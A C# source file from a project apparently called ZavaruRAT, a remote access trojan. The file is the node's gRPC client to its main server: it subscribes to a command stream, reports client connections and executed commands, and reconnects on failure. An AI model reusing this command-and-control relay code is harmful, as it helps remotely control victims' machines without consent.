#region

using Google.Protobuf.WellKnownTypes;
using Grpc.Core;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Node.Runtime;

public sealed class MainServerClient
{
    private ActionHub.ActionHubClient _actionClient;
    private EventHub.EventHubClient _eventClient;
    private readonly IConfiguration _configuration;
    private readonly ILogger<MainServerClient> _logger;

    private bool _ready;

    public MainServerClient(ActionHub.ActionHubClient actionClient, EventHub.EventHubClient eventClient,
                            IConfiguration configuration, ILogger<MainServerClient> logger)
    {
        _actionClient = actionClient;
        _eventClient = eventClient;
        _configuration = configuration;
        _logger = logger;

        _ready = true;
    }

    public AsyncServerStreamingCall<CommandEvent>? SubscribeToCommands(CancellationToken cancellationToken = default)
    {
        if (_ready)
        {
            return _eventClient.Commands(new Empty(), cancellationToken: cancellationToken);
        }

        return null;
    }

    public async Task SendClientConnected(ClientConnectedEvent ev, CancellationToken cancellationToken = default)
    {
        if (_ready)
        {
            await _eventClient.ClientConnectedAsync(ev, cancellationToken: cancellationToken);
        }
    }

    public async Task SendClientDisconnected(ClientDisconnectedEvent ev, CancellationToken cancellationToken = default)
    {
        if (_ready)
        {
            await _eventClient.ClientDisconnectedAsync(ev, cancellationToken: cancellationToken);
        }
    }

    public async Task SendCommandExecutedAsync(CommandExecutedEvent ev, CancellationToken cancellationToken = default)
    {
        if (_ready)
        {
            await _eventClient.CommandExecutedAsync(ev, cancellationToken: cancellationToken);
        }
    }

    public async Task ResyncClientsAsync(ResyncClientsRequest evs,
                                         CancellationToken cancellationToken = default)
    {
        if (_ready)
        {
            await _actionClient.ResyncClientsAsync(evs, cancellationToken: cancellationToken);
        }
    }

    public async Task<bool> TryReconnect()
    {
        try
        {
            await _actionClient.PingAsync(new Empty());
            _ready = true;

            return _ready;
        }
        catch (Exception e)
        {
            _logger.LogWarning(e, "Looks like we're disconnected from main server");
        }

        _ready = false;

        try
        {
            var channel = ZavaruExtensions.CreateChannel(_configuration);

            _actionClient = new ActionHub.ActionHubClient(channel);
            _eventClient = new EventHub.EventHubClient(channel);

            await _actionClient.PingAsync(new Empty());

            _ready = true;
        }
        catch (Exception e)
        {
            _logger.LogError(e, "Unable to reconnect to the main server");
        }

        return _ready;
    }
}
